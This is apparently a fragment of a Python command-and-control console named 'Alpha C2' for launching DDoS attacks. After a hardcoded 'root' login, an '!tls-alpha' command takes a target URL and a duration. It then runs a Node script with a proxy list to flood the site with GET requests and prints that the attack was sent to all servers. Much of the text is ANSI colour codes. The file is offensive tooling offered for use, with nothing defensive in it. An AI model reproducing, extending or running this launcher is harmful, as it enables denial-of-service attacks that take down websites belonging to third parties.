[38;2;255;255;255m [38;2;252;252;255m╚[38;2;249;249;255m═[38;2;246;246;255m═[38;2;243;243;255m═[38;2;240;240;255m═[38;2;237;237;255m═[38;2;234;234;255m═[38;2;231;231;255m═[38;2;228;228;255m═[38;2;225;225;255m═[38;2;222;222;255m═[38;2;219;219;255m═[38;2;216;216;255m═[38;2;213;213;255m═[38;2;210;210;255m═[38;2;207;207;255m═[38;2;204;204;255m═[38;2;201;201;255m═[38;2;198;198;255m═[38;2;195;195;255m═[38;2;192;192;255m═[38;2;189;189;255m═[38;2;186;186;255m═[38;2;183;183;255m═[38;2;180;180;255m═[38;2;177;177;255m═[38;2;174;174;255m═[38;2;171;171;255m═[38;2;168;168;255m═[38;2;165;165;255m═[38;2;162;162;255m═[38;2;159;159;255m═[38;2;156;156;255m═[38;2;153;153;255m═[38;2;150;150;255m═[38;2;147;147;255m═[38;2;144;144;255m═[38;2;141;141;255m═[38;2;138;138;255m═[38;2;135;135;255m═[38;2;132;132;255m═[38;2;129;129;255m═[38;2;126;126;255m═[38;2;123;123;255m═[38;2;120;120;255m═[38;2;117;117;255m═[38;2;114;114;255m═[38;2;111;111;255m═[38;2;108;108;255m═[38;2;105;105;255m═[38;2;102;102;255m═[38;2;99;99;255m═[38;2;96;96;255m═[38;2;93;93;255m═[38;2;90;90;255m═[38;2;87;87;255m═[38;2;84;84;255m═[38;2;81;81;255m═[38;2;78;78;255m═[38;2;75;75;255m═[38;2;72;72;255m═[38;2;69;69;255m═[38;2;66;66;255m═[38;2;63;63;255m═[38;2;60;60;255m═[38;2;57;57;255m═[38;2;54;54;255m═[38;2;51;51;255m═[38;2;48;48;255m╝
[0;00m""")
def main():
    menu()
    while(True):
        cnc = input(f""" [38;2;255;255;255m[[38;2;242;243;254m [38;2;229;231;253mR[38;2;216;219;252mo[38;2;203;207;251mo[38;2;190;195;250mt[38;2;177;183;249m [38;2;164;171;248m⚡[38;2;151;159;247m [38;2;138;147;246mA[38;2;125;135;245ml[38;2;112;123;244mp[38;2;99;111;243mh[38;2;86;99;242ma[38;2;73;87;241m [38;2;60;75;240m][38;2;47;63;239m [38;2;34;51;238m> \033[0m""")
        if cnc == "METHODS" or cnc == "methods" or cnc == "Methods":
            meth()
        elif cnc == "CLEAR" or cnc == "clear" or cnc == "cls":
            main()
        elif cnc == "MYIP" or cnc == "myip" or cnc == "ip":
            mip()
        elif cnc == "ACCOUNT" or cnc == "Account" or cnc == "account":
            account()
        elif cnc == "HELP" or cnc == "Help" or cnc == "help":
            help()
        
            #######L7######
        elif "!tls-alpha" in cnc:
            try:
                url=cnc.split()[1]
                time=cnc.split()[2]
                print(f"""
 [38;2;255;250;250m [38;2;255;245;245mA[38;2;255;240;240mt[38;2;255;235;235mt[38;2;255;230;230ma[38;2;255;225;225mc[38;2;255;220;220mk[38;2;255;215;215m [38;2;255;210;210mS[38;2;255;205;205mu[38;2;255;200;200mc[38;2;255;195;195mc[38;2;255;190;190me[38;2;255;185;185ms[38;2;255;180;180mF[38;2;255;175;175mu[38;2;255;170;170ml[38;2;255;165;165ml[38;2;255;160;160my[38;2;255;155;155m [38;2;255;150;150mS[38;2;255;145;145me[38;2;255;140;140mn[38;2;255;135;135mt[38;2;255;130;130m [38;2;255;125;125m![38;2;255;120;120m [38;2;255;115;115mT[38;2;255;110;110mo[38;2;255;105;105m [38;2;255;100;100mA[38;2;255;95;95ml[38;2;255;90;90ml[38;2;255;85;85m [38;2;255;80;80mA[38;2;255;75;75ml[38;2;255;70;70mp[38;2;255;65;65mh[38;2;255;60;60ma[38;2;255;55;55m [38;2;255;50;50mS[38;2;255;45;45me[38;2;255;40;40mv[38;2;255;35;35me[38;2;255;30;30mr[38;2;255;25;25m
""")
                os.system(f"node .raw.js {url} {time} 90 5 GET proxy.txt")
            except IndexError:
                print(" ! ")
                print(" • ")
        else:
            try:
                cmd=cnc.split()[0]
                print("Command : [ "+cmd+" ] Not Found!!")
            except IndexError:
                pass
            
def login():
    user = "root"
    passwd = ""
    username = input(" ! Username: ")
    password = getpass.getpass(prompt=' ! Password: ')
    if username != user or password != passwd:
        print("")
        print("👻")
        sys.exit(1)
    elif username == user and password == passwd:
        print("Welcome To Alpha C2 !")
        time.sleep(1)
        
        main()

login()
